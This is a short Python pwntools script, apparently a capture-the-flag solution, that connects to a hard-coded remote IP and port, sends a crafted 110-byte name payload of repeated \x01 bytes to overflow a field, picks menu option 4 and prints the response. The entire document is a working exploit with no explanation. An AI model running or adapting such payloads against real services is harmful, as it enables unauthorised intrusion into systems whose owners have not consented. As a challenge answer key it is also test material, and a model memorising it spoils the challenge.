from pwn import *


r = remote("13.232.34.171", 30917)
r.readuntil(b"name: ")

r.send(b"J" + b"\x01" * (110 - 1) + b"\n")
r.readuntil(b"choice: ")
r.send(b"4\n")
print(r.readall())
